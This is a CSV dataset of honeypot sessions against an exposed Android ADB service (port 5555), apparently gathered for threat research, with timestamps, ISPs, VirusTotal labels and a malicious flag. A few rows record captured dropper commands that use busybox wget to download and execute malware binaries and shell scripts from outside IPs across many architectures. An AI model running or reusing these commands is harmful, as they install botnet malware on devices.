session_id,Anon Src IP,src_port,Dst IP,dest_port,start_time,end_time,duration,sensor,commands,VT Labels,VT Reputation,Geo Location,ISP,Malicious_Flag
1f1d1dd4206e,191.189.60.54,52046,192.168.48.2,5555,2025-02-28T17:25:57.933380Z,2025-02-28T17:26:43.060494Z,45.13,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, malware",-1,NL,AS198584 PIO-Hosting GmbH,0
970eeb4323c0,206.101.125.34,51882,192.168.48.2,5555,2025-02-28T19:07:21.851749Z,2025-02-28T19:12:22.014650Z,300.16,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
7b1704b9bf49,76.69.249.206,47644,192.168.48.2,5555,2025-02-28T22:38:21.059197Z,2025-02-28T22:39:06.086554Z,45.03,honeypot01,cd /data/local/tmp/; busybox wget https://176.65.134.62/w.sh; sh w.sh; curl https://176.65.134.62/c.sh; sh c.sh; wget https://176.65.134.62/wget.sh; sh wget.sh; curl https://176.65.134.62/wget.sh; sh wget.sh; busybox wget https://176.65.134.62/wget.sh; sh wget.sh; busybox curl https://176.65.134.62/wget.sh; sh wget.sh,"malicious, malware",-4,SI,AS208191 Go Host Ltd,0
59fd5c064278,240.113.219.165,37612,192.168.48.2,5555,2025-03-01T00:14:51.594206Z,2025-03-01T00:19:51.785323Z,300.19,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
821d4341279a,240.113.219.165,42906,192.168.48.2,5555,2025-03-01T00:15:03.497827Z,2025-03-01T00:20:03.687103Z,300.19,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
6aa35d25af79,240.113.219.165,33062,192.168.48.2,5555,2025-03-01T00:19:03.261592Z,2025-03-01T00:24:03.458546Z,300.2,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
c8b7c32708bf,240.113.219.165,36230,192.168.48.2,5555,2025-03-01T00:22:45.064832Z,2025-03-01T00:27:45.206396Z,300.14,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
bffdae2f10de,240.113.219.165,33328,192.168.48.2,5555,2025-03-01T00:23:36.270862Z,2025-03-01T00:28:36.450761Z,300.18,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
82f9ee05b3b8,240.113.219.165,44084,192.168.48.2,5555,2025-03-01T00:26:48.872363Z,2025-03-01T00:31:49.070887Z,300.2,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
9410208b9ebd,6.251.21.244,60458,192.168.48.2,5555,2025-03-01T01:27:09.069369Z,2025-03-01T01:32:09.178189Z,300.11,honeypot01,,"malicious, phishing, malware",-2,TW,AS396982 Google LLC,0
de471f06447b,6.251.21.244,62740,192.168.48.2,5555,2025-03-01T01:27:19.069343Z,2025-03-01T01:32:19.199927Z,300.13,honeypot01,,"malicious, phishing, malware",-2,TW,AS396982 Google LLC,0
fd2f6704a3a8,132.202.251.173,57552,192.168.48.2,5555,2025-03-01T02:15:10.264858Z,2025-03-01T02:20:10.530762Z,300.27,honeypot01,,"malicious, malware",-2,US,AS6939 Hurricane Electric LLC,0
69d57ef3e69d,137.104.47.124,63318,172.31.0.2,5555,2025-03-26T03:59:39.468731Z,2025-03-26T04:04:39.530468Z,300.06,honeypot01,,"malicious, phishing, malware",-17,US,AS6939 Hurricane Electric LLC,0
050aab969922,1.0.170.130,56262,172.31.0.2,5555,2025-03-26T05:39:27.606421Z,2025-03-26T05:44:27.685143Z,300.08,honeypot01,,"malware, malicious",-1,LT,AS214295 SKYNET NETWORK LTD,0
78143deb05c2,171.75.79.237,46896,172.31.0.2,5555,2025-03-26T05:55:29.630346Z,2025-03-26T06:00:29.849816Z,300.22,honeypot01,,malware,0,CN,AS141679 China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch,0
7f62b30aa49f,213.235.213.187,61543,172.31.0.2,5555,2025-03-26T06:22:06.775355Z,2025-03-26T06:27:08.099041Z,301.32,honeypot01,echo hello,malicious,0,CN,AS4837 CHINA UNICOM China169 Backbone,0
715f281087d2,171.75.79.237,51398,172.31.0.2,5555,2025-03-26T06:43:52.233400Z,2025-03-26T06:48:52.415604Z,300.18,honeypot01,,malware,0,CN,AS141679 China Telecom Beijing Tianjin Hebei Big Data Industry Park Branch,0
7788dcd19e50,238.219.135.194,41968,172.31.0.2,5555,2025-03-26T11:51:56.088989Z,2025-03-26T11:56:56.186489Z,300.1,honeypot01,,"malware, malicious",0,US,"AS16509 Amazon.com, Inc.",0
231e587da5a5,238.219.135.194,41992,172.31.0.2,5555,2025-03-26T11:51:58.281274Z,2025-03-26T11:56:58.391119Z,300.11,honeypot01,,"malware, malicious",0,US,"AS16509 Amazon.com, Inc.",0
31e0c20a28b0,238.219.135.194,52808,172.31.0.2,5555,2025-03-26T11:52:04.095635Z,2025-03-26T11:57:04.198864Z,300.1,honeypot01,,"malware, malicious",0,US,"AS16509 Amazon.com, Inc.",0
d1123916a08a,238.219.135.194,52832,172.31.0.2,5555,2025-03-26T11:52:09.476579Z,2025-03-26T11:57:09.587505Z,300.11,honeypot01,,"malware, malicious",0,US,"AS16509 Amazon.com, Inc.",0
893e37ff807c,238.219.135.194,52842,172.31.0.2,5555,2025-03-26T11:52:09.681240Z,2025-03-26T11:57:09.787483Z,300.11,honeypot01,,"malware, malicious",0,US,"AS16509 Amazon.com, Inc.",0
f95229ad085f,238.219.135.194,51504,172.31.0.2,5555,2025-03-26T11:53:10.448246Z,2025-03-26T11:58:10.553526Z,300.11,honeypot01,,"malware, malicious",0,US,"AS16509 Amazon.com, Inc.",0
0df0f2813a7d,68.185.216.31,34992,172.31.0.2,5555,2025-03-26T15:08:38.196668Z,2025-03-26T15:13:38.403490Z,300.21,honeypot01,,"malicious, phishing, malware",-18,US,AS6939 Hurricane Electric LLC,0
95f72d0cc09b,234.134.60.233,42566,172.31.0.2,5555,2025-03-26T17:25:17.538383Z,2025-03-26T17:30:17.697713Z,300.16,honeypot01,,"malicious, malware",0,US,AS8075 Microsoft Corporation,0
2cc0b284aea1,69.84.251.67,56274,172.31.0.2,5555,2025-03-27T00:49:42.320514Z,2025-03-27T00:50:28.058559Z,45.74,honeypot01,cd /data/local/tmp/; busybox wget http://42.112.26.36/arm; chmod 777 arm; ./arm adb; busybox wget http://42.112.26.36/arm7; chmod 777 arm7; ./arm7 adb; busybox wget http://42.112.26.36/arm5; chmod 777 arm5; ./arm5 adb; busybox wget http://42.112.26.36/aarch64; chmod 777 aarch64; ./aarch64 adb.aarch,"malware, phishing, malicious",-2,NO,"AS200195 Verasel, Inc.",0
f4b5c0fc7ff4,106.54.110.246,35076,172.31.0.2,5555,2025-03-27T01:40:22.453254Z,2025-03-27T01:45:22.669763Z,300.22,honeypot01,,malicious,-1,CA,AS16276 OVH SAS,0
8f4b7e020edf,6.251.21.147,60748,172.31.0.2,5555,2025-03-27T03:04:32.603636Z,2025-03-27T03:09:32.717123Z,300.11,honeypot01,,"malicious, malware, phishing",-55,TW,AS396982 Google LLC,1
4b6152fc4a4b,6.251.21.147,62542,172.31.0.2,5555,2025-03-27T03:04:42.604508Z,2025-03-27T03:09:42.736393Z,300.13,honeypot01,,"malicious, malware, phishing",-55,TW,AS396982 Google LLC,1
1ceda0faba11,133.94.237.107,18809,172.28.0.2,5555,2025-02-27T03:54:44.261913Z,2025-02-27T03:59:44.379204Z,300.12,honeypot01,,"phishing, malicious, malware",-3,US,AS6939 Hurricane Electric LLC,0
33a41395c225,144.154.157.233,59750,172.28.0.2,5555,2025-02-27T12:13:59.345507Z,2025-02-27T12:14:45.067711Z,45.72,honeypot01,cd /data/local/tmp/; busybox wget http://213.209.129.55/poop.sh; sh poop.sh; rm -rf poop.sh,malware,0,NL,AS215925 VPSVAULT.HOST LTD,0
a490257461ab,68.185.216.30,22342,172.28.0.2,5555,2025-02-27T15:34:13.619933Z,2025-02-27T15:39:13.964684Z,300.34,honeypot01,,"malicious, phishing, malware",32,US,AS6939 Hurricane Electric LLC,0
e4b52173203d,75.109.110.115,38841,172.28.0.2,5555,2025-02-27T22:03:25.531354Z,2025-02-27T22:08:25.653333Z,300.12,honeypot01,,"malicious, malware",0,MN,AS45204 GEMNET LLC,0
c4eb1a05d3d7,132.202.251.38,63914,192.168.16.2,5555,2025-03-25T08:36:21.343015Z,2025-03-25T08:41:21.567998Z,300.23,honeypot01,,"malicious, malware, phishing",-2,US,AS6939 Hurricane Electric LLC,0
8af4fd45b2a7,152.63.223.107,63474,192.168.16.2,5555,2025-03-25T09:56:26.503550Z,2025-03-25T10:01:27.388784Z,300.89,honeypot01,,"malicious, malware",0,NL,AS209272 Alviva Holding Limited,0
4d33efcf8893,152.60.107.245,46025,192.168.16.2,5555,2025-03-25T10:48:06.124675Z,2025-03-25T10:53:06.164012Z,300.04,honeypot01,,"malicious, malware",-1,FR,AS213412 ONYPHE SAS,0
046b9430a8b6,152.60.107.240,60589,192.168.16.2,5555,2025-03-25T10:48:06.952309Z,2025-03-25T10:53:07.220656Z,300.27,honeypot01,,"malicious, malware",-1,FR,AS213412 ONYPHE SAS,0
d0ad9bf8c9ee,121.187.86.8,41166,192.168.16.2,5555,2025-03-25T16:18:16.016142Z,2025-03-25T16:23:16.034743Z,300.02,honeypot01,,"malicious, malware",-1,CA,"AS14061 DigitalOcean, LLC",0
5ba544baf76b,121.187.14.46,35840,192.168.16.2,5555,2025-03-25T17:24:23.401138Z,2025-03-25T17:29:23.481723Z,300.08,honeypot01,,"malicious, malware",-1,US,"AS14061 DigitalOcean, LLC",0
3debb153a7af,182.122.242.243,51278,192.168.16.2,5555,2025-03-26T00:09:40.543625Z,2025-03-26T00:14:40.588465Z,300.05,honeypot01,,"malicious, malware",0,CN,"AS23724 IDC, China Telecommunications Corporation",0
cc24613066c5,182.122.242.243,52398,192.168.16.2,5555,2025-03-26T00:09:48.539901Z,2025-03-26T00:14:48.599999Z,300.06,honeypot01,,"malicious, malware",0,CN,"AS23724 IDC, China Telecommunications Corporation",0
761c04581956,182.122.242.243,53118,192.168.16.2,5555,2025-03-26T00:09:56.540046Z,2025-03-26T00:14:56.722075Z,300.18,honeypot01,,"malicious, malware",0,CN,"AS23724 IDC, China Telecommunications Corporation",0
43110ef45ebf,133.94.237.35,56461,172.30.0.2,5555,2025-03-24T11:04:36.264318Z,2025-03-24T11:09:36.347053Z,300.08,honeypot01,,"malicious, malware, phishing",-2,US,AS6939 Hurricane Electric LLC,0
50727c4c5cd3,211.131.226.186,64218,172.30.0.2,5555,2025-03-24T17:25:13.352227Z,2025-03-24T17:30:13.420221Z,300.07,honeypot01,,"malicious, phishing, malware",-4,RU,AS198953 Proton66 OOO,0
18eca94f1786,132.202.226.125,36416,172.30.0.2,5555,2025-03-25T01:34:31.735068Z,2025-03-25T01:39:31.861224Z,300.13,honeypot01,,"malicious, phishing, malware",-16,US,AS6939 Hurricane Electric LLC,0
38fded4af35b,91.216.17.102,57838,172.30.0.2,5555,2025-03-25T01:36:26.108539Z,2025-03-25T01:41:26.204963Z,300.1,honeypot01,,,0,VN,AS45899 VNPT Corp,0
8df016b3ca99,91.216.17.102,36236,172.30.0.2,5555,2025-03-25T01:36:31.108658Z,2025-03-25T01:41:31.166978Z,300.06,honeypot01,,,0,VN,AS45899 VNPT Corp,0
568d63ca3e43,12.47.16.91,59966,172.30.0.2,5555,2025-03-25T03:38:06.116204Z,2025-03-25T03:43:06.219217Z,300.1,honeypot01,,"malicious, phishing, malware",-3,BR,AS396982 Google LLC,0
7d7b4ea18273,12.47.16.91,59010,172.30.0.2,5555,2025-03-25T03:38:16.118166Z,2025-03-25T03:43:16.235788Z,300.12,honeypot01,,"malicious, phishing, malware",-3,BR,AS396982 Google LLC,0
cbe0fac84c9e,234.244.4.211,43406,172.30.0.2,5555,2025-03-23T04:02:29.056999Z,2025-03-23T04:07:29.577788Z,300.52,honeypot01,,"malicious, malware",0,HK,AS8075 Microsoft Corporation,0
4c7ecefc77f4,202.24.244.167,48084,172.30.0.2,5555,2025-03-23T15:13:43.858840Z,2025-03-23T15:18:44.045096Z,300.19,honeypot01,,"malicious, malware",0,US,AS8075 Microsoft Corporation,0
0febd3c0b5f4,133.94.237.66,33636,172.30.0.2,5555,2025-03-23T15:38:32.038928Z,2025-03-23T15:43:32.334269Z,300.3,honeypot01,,"malicious, phishing, malware",-54,US,AS6939 Hurricane Electric LLC,1
3d9186bafc4b,5.59.92.75,51426,172.30.0.2,5555,2025-03-23T16:26:03.902129Z,2025-03-23T16:26:49.058985Z,45.16,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, malware",0,NL,AS401120 cheapy.host LLC,0
e851bf080440,18.18.97.248,39474,172.30.0.2,5555,2025-03-23T17:43:39.544600Z,2025-03-23T17:48:39.744073Z,300.2,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
599067f4d0f9,69.247.130.18,48152,172.30.0.2,5555,2025-03-23T23:52:46.927850Z,2025-03-23T23:57:46.993352Z,300.07,honeypot01,,"malicious, malware, phishing",-8,NL,AS49870 Alsycon B.V.,0
ed004cb06ff9,69.247.130.18,48144,172.30.0.2,5555,2025-03-23T23:52:46.936158Z,2025-03-23T23:57:46.987889Z,300.05,honeypot01,,"malicious, malware, phishing",-8,NL,AS49870 Alsycon B.V.,0
1802ec33f8b4,69.247.130.18,48154,172.30.0.2,5555,2025-03-23T23:52:46.937063Z,2025-03-23T23:57:46.987103Z,300.05,honeypot01,,"malicious, malware, phishing",-8,NL,AS49870 Alsycon B.V.,0
8560907f274c,211.156.121.11,49135,172.20.0.2,5555,2025-03-22T05:42:28.440935Z,2025-03-22T05:47:28.531083Z,300.09,honeypot01,,"malicious, malware, phishing",-52,US,"AS211680 NSEC - Sistemas Informaticos, S.A.",1
04420dc9e345,211.156.121.11,55083,172.20.0.2,5555,2025-03-22T05:42:36.489483Z,2025-03-22T05:47:36.575866Z,300.09,honeypot01,,"malicious, malware, phishing",-52,US,"AS211680 NSEC - Sistemas Informaticos, S.A.",1
a477ab179870,211.156.121.10,52285,172.20.0.2,5555,2025-03-22T05:42:49.533950Z,2025-03-22T05:47:49.679095Z,300.15,honeypot01,,"malicious, malware, phishing",-1,US,"AS211680 NSEC - Sistemas Informaticos, S.A.",0
af8a3dcb85d8,211.156.121.13,59559,172.20.0.2,5555,2025-03-22T05:42:57.601516Z,2025-03-22T05:47:57.688967Z,300.09,honeypot01,,"malicious, phishing, malware",0,US,"AS211680 NSEC - Sistemas Informaticos, S.A.",0
83deff8b66f7,211.156.121.11,35243,172.20.0.2,5555,2025-03-22T05:43:13.677077Z,2025-03-22T05:48:13.751867Z,300.07,honeypot01,,"malicious, malware, phishing",-52,US,"AS211680 NSEC - Sistemas Informaticos, S.A.",1
82106a070a90,211.156.121.10,53653,172.20.0.2,5555,2025-03-22T05:43:17.702537Z,2025-03-22T05:48:17.859156Z,300.16,honeypot01,,"malicious, malware, phishing",-1,US,"AS211680 NSEC - Sistemas Informaticos, S.A.",0
2f8761b0c00e,6.251.21.106,59588,172.20.0.2,5555,2025-03-22T07:54:11.519922Z,2025-03-22T07:59:11.630988Z,300.11,honeypot01,,"malicious, malware, phishing",-7,BE,AS396982 Google LLC,0
baf12602e712,6.251.21.106,63700,172.20.0.2,5555,2025-03-22T07:54:21.520720Z,2025-03-22T07:59:21.674927Z,300.15,honeypot01,,"malicious, malware, phishing",-7,BE,AS396982 Google LLC,0
26f6eee16c08,180.216.250.34,56590,172.20.0.2,5555,2025-03-22T09:08:20.030912Z,2025-03-22T09:13:20.035835Z,300.0,honeypot01,,"malicious, malware, phishing",-1,DE,"AS14061 DigitalOcean, LLC",0
7cec784e2bb6,180.216.250.34,49318,172.20.0.2,5555,2025-03-22T09:08:31.103119Z,2025-03-22T09:13:31.242059Z,300.14,honeypot01,,"malicious, malware, phishing",-1,DE,"AS14061 DigitalOcean, LLC",0
929df0acb815,180.216.250.34,38274,172.20.0.2,5555,2025-03-22T09:08:40.596727Z,2025-03-22T09:13:40.643177Z,300.05,honeypot01,,"malicious, malware, phishing",-1,DE,"AS14061 DigitalOcean, LLC",0
729a0be220e6,180.216.250.34,41688,172.20.0.2,5555,2025-03-22T09:08:50.595817Z,2025-03-22T09:13:50.630013Z,300.03,honeypot01,,"malicious, malware, phishing",-1,DE,"AS14061 DigitalOcean, LLC",0
6a3941c78489,180.216.250.34,53232,172.20.0.2,5555,2025-03-22T09:09:00.594702Z,2025-03-22T09:14:00.642541Z,300.05,honeypot01,,"malicious, malware, phishing",-1,DE,"AS14061 DigitalOcean, LLC",0
3d493a7968de,180.216.250.34,33920,172.20.0.2,5555,2025-03-22T09:09:10.591998Z,2025-03-22T09:14:10.643538Z,300.05,honeypot01,,"malicious, malware, phishing",-1,DE,"AS14061 DigitalOcean, LLC",0
83e833e032d1,68.185.136.229,37830,172.20.0.2,5555,2025-03-22T13:11:31.048263Z,2025-03-22T13:16:31.263163Z,300.21,honeypot01,,"malicious, phishing, malware",-20,US,AS6939 Hurricane Electric LLC,0
efacd536cc69,18.18.97.248,51878,172.20.0.2,5555,2025-03-22T16:25:22.364248Z,2025-03-22T16:30:22.573664Z,300.21,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
2ea7dae10b57,131.214.110.177,56626,172.20.0.2,5555,2025-03-22T19:00:09.734930Z,2025-03-22T19:05:10.063355Z,300.33,honeypot01,,"malicious, malware",0,CN,AS135629 Ningxia West Cloud Data Technology Co.Ltd.,0
83b8a67cb540,133.94.131.253,35415,172.20.0.2,5555,2025-03-23T00:38:19.983342Z,2025-03-23T00:43:20.071876Z,300.09,honeypot01,,"malicious, malware",-16,US,AS6939 Hurricane Electric LLC,0
019be3c257d6,91.72.1.3,56962,172.20.0.2,5555,2025-03-23T02:00:15.234197Z,2025-03-23T02:05:15.395756Z,300.16,honeypot01,,"malicious, phishing",-4,US,"AS14061 DigitalOcean, LLC",0
33c3b01a9045,95.39.116.188,47948,172.20.0.2,5555,2025-03-23T03:29:27.834832Z,2025-03-23T03:34:27.981334Z,300.15,honeypot01,,"malicious, phishing",-14,US,"AS14061 DigitalOcean, LLC",0
fb321938a33e,93.225.156.40,40198,172.31.0.2,5555,2025-03-21T06:12:47.493474Z,2025-03-21T06:17:47.603410Z,300.11,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
cc320ccfa44a,93.225.156.40,40254,172.31.0.2,5555,2025-03-21T06:12:57.746665Z,2025-03-21T06:17:57.806320Z,300.06,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
e859d4a9bbeb,93.225.156.40,43734,172.31.0.2,5555,2025-03-21T06:13:07.750156Z,2025-03-21T06:18:07.805510Z,300.06,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
3e1d1be59eb9,93.225.156.40,59216,172.31.0.2,5555,2025-03-21T06:13:17.747047Z,2025-03-21T06:18:17.808612Z,300.06,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
ff11470e920b,93.225.156.40,53550,172.31.0.2,5555,2025-03-21T06:13:27.749609Z,2025-03-21T06:18:27.807262Z,300.06,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
577f3037febb,93.225.156.40,51766,172.31.0.2,5555,2025-03-21T06:13:37.752012Z,2025-03-21T06:18:37.817000Z,300.07,honeypot01,,"malicious, malware, phishing",-5,DE,"AS14061 DigitalOcean, LLC",0
12884ecb647a,128.255.1.230,42024,172.31.0.2,5555,2025-03-21T15:47:58.711328Z,2025-03-21T15:52:58.876021Z,300.17,honeypot01,,"malicious, phishing, malware",-55,US,"AS10439 CariNet, Inc.",1
c091c5daf637,228.107.92.15,46808,172.31.0.2,5555,2025-03-21T16:00:10.657888Z,2025-03-21T16:05:10.721314Z,300.06,honeypot01,,"malicious, malware",0,US,"AS14061 DigitalOcean, LLC",0
1747225fc583,228.107.92.15,46822,172.31.0.2,5555,2025-03-21T16:00:13.662265Z,2025-03-21T16:05:13.730455Z,300.07,honeypot01,,"malicious, malware",0,US,"AS14061 DigitalOcean, LLC",0
9cdea22add04,128.255.1.230,53062,172.31.0.2,5555,2025-03-21T16:03:28.002742Z,2025-03-21T16:08:28.027561Z,300.03,honeypot01,,"malicious, phishing, malware",-55,US,"AS10439 CariNet, Inc.",1
3928b3280c23,211.50.141.247,60000,172.31.0.2,5555,2025-03-21T16:04:26.242877Z,2025-03-21T16:04:57.234960Z,30.99,honeypot01,,"malicious, malware",-3,US,AS63949 Akamai Connected Cloud,0
51f402d0d7bb,109.161.203.109,53466,172.31.0.2,5555,2025-03-21T17:17:42.340517Z,2025-03-21T17:22:42.516808Z,300.18,honeypot01,,"malicious, malware, phishing",-5,US,"AS14061 DigitalOcean, LLC",0
2b0871b25d28,109.161.203.109,57776,172.31.0.2,5555,2025-03-21T17:17:52.512733Z,2025-03-21T17:22:52.566149Z,300.05,honeypot01,,"malicious, malware, phishing",-5,US,"AS14061 DigitalOcean, LLC",0
2730ccb916e6,109.161.203.109,40938,172.31.0.2,5555,2025-03-21T17:18:02.675898Z,2025-03-21T17:23:02.684340Z,300.01,honeypot01,,"malicious, malware, phishing",-5,US,"AS14061 DigitalOcean, LLC",0
1d7831e522d7,109.161.203.109,57212,172.31.0.2,5555,2025-03-21T17:18:12.673687Z,2025-03-21T17:23:12.766851Z,300.09,honeypot01,,"malicious, malware, phishing",-5,US,"AS14061 DigitalOcean, LLC",0
7f66ce207abb,109.161.203.109,49520,172.31.0.2,5555,2025-03-21T17:18:22.678446Z,2025-03-21T17:23:22.756535Z,300.08,honeypot01,,"malicious, malware, phishing",-5,US,"AS14061 DigitalOcean, LLC",0
02c6953df5dc,109.161.203.109,54710,172.31.0.2,5555,2025-03-21T17:18:32.684991Z,2025-03-21T17:23:32.767643Z,300.08,honeypot01,,"malicious, malware, phishing",-5,US,"AS14061 DigitalOcean, LLC",0
58a707804fc6,80.190.72.31,44432,172.31.0.2,5555,2025-03-21T19:30:33.102096Z,2025-03-21T19:35:33.207777Z,300.11,honeypot01,,malicious,0,KR,AS9318 SK Broadband Co Ltd,0
445edaea70cb,5.59.92.13,53910,172.31.0.2,5555,2025-03-22T00:21:58.229400Z,2025-03-22T00:22:44.062900Z,45.83,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, phishing, malware",0,NL,AS401120 cheapy.host LLC,0
0191a983772d,137.104.47.124,41572,192.168.48.2,5555,2025-03-20T04:59:26.607345Z,2025-03-20T05:04:26.885192Z,300.28,honeypot01,,"malicious, phishing, malware",-17,US,AS6939 Hurricane Electric LLC,0
53f16df868fc,80.190.72.31,51858,192.168.48.2,5555,2025-03-20T07:20:20.461231Z,2025-03-20T07:25:20.641670Z,300.18,honeypot01,,malicious,0,KR,AS9318 SK Broadband Co Ltd,0
034120675fcc,12.47.16.99,62064,192.168.48.2,5555,2025-03-20T09:31:13.650929Z,2025-03-20T09:36:13.709097Z,300.06,honeypot01,,"phishing, malicious, malware",-4,BR,AS396982 Google LLC,0
7d8c72251ede,12.47.16.99,60192,192.168.48.2,5555,2025-03-20T09:31:23.650997Z,2025-03-20T09:36:23.724010Z,300.07,honeypot01,,"phishing, malicious, malware",-4,BR,AS396982 Google LLC,0
7849f2eaa342,6.251.21.168,62986,192.168.48.2,5555,2025-03-20T09:50:04.876862Z,2025-03-20T09:55:04.933158Z,300.06,honeypot01,,"malicious, malware, phishing",-1,TW,AS396982 Google LLC,0
29db2efc4c7f,6.251.21.168,60584,192.168.48.2,5555,2025-03-20T09:50:14.879439Z,2025-03-20T09:55:15.051501Z,300.17,honeypot01,,"malicious, malware, phishing",-1,TW,AS396982 Google LLC,0
39daa370c277,234.70.168.237,36684,192.168.48.2,5555,2025-03-20T14:07:42.680466Z,2025-03-20T14:12:42.852067Z,300.17,honeypot01,,"malicious, malware",0,US,AS8075 Microsoft Corporation,0
8aa8596aecf4,18.18.97.248,59020,192.168.48.2,5555,2025-03-20T16:27:45.594546Z,2025-03-20T16:32:45.769469Z,300.18,honeypot01,,malicious,0,NL,AS214943 Railnet LLC,0
